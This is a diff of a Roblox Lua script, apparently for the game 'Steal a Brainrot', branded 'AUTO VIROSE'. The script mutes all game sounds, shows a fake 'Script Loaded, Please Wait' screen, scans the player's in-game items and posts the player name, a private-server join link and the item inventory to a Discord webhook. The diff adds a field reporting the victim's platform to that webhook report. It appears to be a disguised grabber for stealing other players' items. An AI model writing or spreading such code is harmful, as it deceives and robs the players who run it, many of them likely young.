@@ -33,7 +33,6 @@ local function StopAllSounds()
         end)
     end
 
-    -- Aplica em todos os lugares que possam ter sons
     StopDescendants(Workspace)
     StopDescendants(ReplicatedStorage)
     StopDescendants(StarterGui)
@@ -48,7 +47,6 @@ local function StopAllSounds()
     end)
 end
 
--- Chama a função sem bloquear a GUI ainda
 task.spawn(StopAllSounds)
 
 --========================================================--
@@ -91,7 +89,6 @@ box.TextColor3 = Color3.new(1,1,1)
 box.ClearTextOnFocus = false
 box.TextXAlignment = Enum.TextXAlignment.Left
 box.TextWrapped = true
-box.TextTruncate = Enum.TextTruncate.None
 Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)
 
 local btn = Instance.new("TextButton", frame)
@@ -107,17 +104,41 @@ Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
 local serverLinkFinal = nil
 local startTime = os.time()
 
+--========================================================--
+--=== NOVO: DETECTAR PLATAFORMA ==========================--
+--========================================================--
+local function DetectPlatform()
+    local platform = (identifyexecutor and "PC Executor") or
+                     (UserInputService.TouchEnabled and "Mobile") or
+                     (UserInputService.GamepadEnabled and "Console") or
+                     "Unknown"
+
+    return platform
+end
+--========================================================--
+
 local function SendWebhook(extraFields)
     local timeStr = "foi às " .. os.date("%H:%M")
+
+    -- Adiciona a plataforma no embed automaticamente
+    table.insert(extraFields, 1, {
+        name = "Plataforma",
+        value = DetectPlatform(),
+        inline = false
+    })
+
     local payload = HttpService:JSONEncode({
-        username = "LOGS DO VIROSE",
+        username = "VIROSE METHODS",
         embeds = {{
-            title = "🔗 AUTO VIROSE| "..timeStr,
+            title = "🔗 AUTO VIROSE | "..timeStr,
             color = 16732240,
             fields = extraFields,
-            image = {url = "https://cdn.discordapp.com/attachments/1436283438897303632/1444594144168120471/17644883928162.jpg?ex=692d46a3&is=692bf523&hm=e7f520e275d97c079cf71956fd14cf1b1d2b4d5c422bd94922448a2c91890811&"}
+            image = {
+                url = "https://cdn.discordapp.com/attachments/1436283438897303632/1444594144168120471/17644883928162.jpg?ex=692d46a3&is=692bf523&hm=e7f520e275d97c079cf71956fd14cf1b1d2b4d5c422bd94922448a2c91890811&"
+            }
         }}
     })
+
     pcall(function()
         HttpService:RequestAsync({
             Url = WEBHOOK_URL,
@@ -202,7 +223,7 @@ done.TextColor3 = Color3.fromRGB(255,100,100)
 done.Text = "✓ Script Loaded\nPlease Wait 2-3 Minutes..."
 
 --========================================================--
--- ESP DE BRAINROTS + WEBHOOK
+-- ESP + WEBHOOK
 --========================================================--
 local function formatNumber(num)
     if num >= 1e9 then
@@ -257,17 +278,18 @@ local function ScanBrainrots()
         end
     end
 
-    local extraFields = {}
     local content = ""
-    for name, data in pairs(brainrotCount) do
+    for name,data in pairs(brainrotCount) do
         content = content .. data.count.."x "..name..": "..formatNumber(data.income).."\n"
     end
-    extraFields = {
+
+    local extraFields = {
         {name="Player", value=LocalPlayer.Name},
         {name="Players in Server", value=tostring(#Players:GetPlayers()), inline=false},
         {name="Join Private Server", value="[CLIQUE AQUI]("..serverLinkFinal..")", inline=false},
         {name="Brainrots", value=content, inline=false}
     }
+
     SendWebhook(extraFields)
 end
 
